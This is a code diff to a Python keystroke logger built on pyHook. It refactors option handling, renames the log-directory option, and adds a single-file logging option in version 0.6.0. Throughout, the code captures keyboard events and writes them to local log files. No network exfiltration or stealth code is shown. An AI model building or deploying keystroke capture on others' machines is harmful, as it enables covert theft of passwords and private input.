@@ -12,9 +12,7 @@ class KeyLogger:
     def __init__(self): 
         
         self.ParseOptions()
-        
         self.hm = pyHook.HookManager()
-    
         self.hm.KeyDown = self.OnKeyboardEvent
     
         if self.options.hookKeyboard == True:
@@ -22,17 +20,16 @@ class KeyLogger:
         #if self.options.hookMouse == True:
         #    self.hm.HookMouse()
         
-        self.lw = LogWriter(self.options.dirname, self.options.debug) 
+        self.lw = LogWriter(self.options) 
         
         pythoncom.PumpMessages()
-            
 
     def OnKeyboardEvent(self, event):
         '''This function is the stuff that's supposed to happen when a key is pressed.
         Calls LogWriter.WriteToLogFile with the keystroke properties.
         '''
         
-        self.lw.WriteToLogFile(event, self.options)
+        self.lw.WriteToLogFile(event)
         
         if event.Key == self.options.exitKey:
             sys.exit()
@@ -43,8 +40,8 @@ class KeyLogger:
         '''Read command line options
         '''
                 
-        parser = OptionParser(version="%prog version 0.4.2")
-        parser.add_option("-f", "--file", action="store", dest="dirname", help="write log data to DIRNAME [default: %default]")
+        parser = OptionParser(version="%prog version 0.6.0")
+        parser.add_option("-f", "--file", action="store", dest="dirName", help="write log data to DIRNAME [default: %default]")
         parser.add_option("-k", "--keyboard", action="store_true", dest="hookKeyboard", help="log keyboard input [default: %default]")
         parser.add_option("-a", "--addlinefeed", action="store_true", dest="addLineFeed", help="add linefeed [\\n] character when carriage return [\\r] character is detected (for Notepad compatibility) [default: %default]")
         parser.add_option("-b", "--parsebackspace", action="store_true", dest="parseBackspace", help="translate backspace chacarter into printable string [default: %default]")
@@ -55,8 +52,9 @@ class KeyLogger:
         parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file) [default: %default]")
         
         parser.add_option("-n", "--nolog", action="append", dest="noLog", help="specify an application by full path name whose input will not be logged. repeat option for multiple applications. [default: %default]")
+        parser.add_option("-o", "--onefile", action="store", dest="oneFile", help="log all output to one file ONEFILE, (inside DIRNAME, as specified with -f option), rather than to multiple files. [default: %default]")
         
-        parser.set_defaults(dirname=r"C:\Temp\logdir",
+        parser.set_defaults(dirName=r"C:\Temp\logdir",
                             hookKeyboard=True,
                             addLineFeed=False,
                             parseBackspace=False,
@@ -64,10 +62,11 @@ class KeyLogger:
                             exitKey='F12',
                             flushKey='F11',
                             debug=False,
-                            noLog=None)
+                            noLog=None,
+                            oneFile=None)
 
         (self.options, args) = parser.parse_args()
-            
+                    
 if __name__ == '__main__':
     kl = KeyLogger()
     
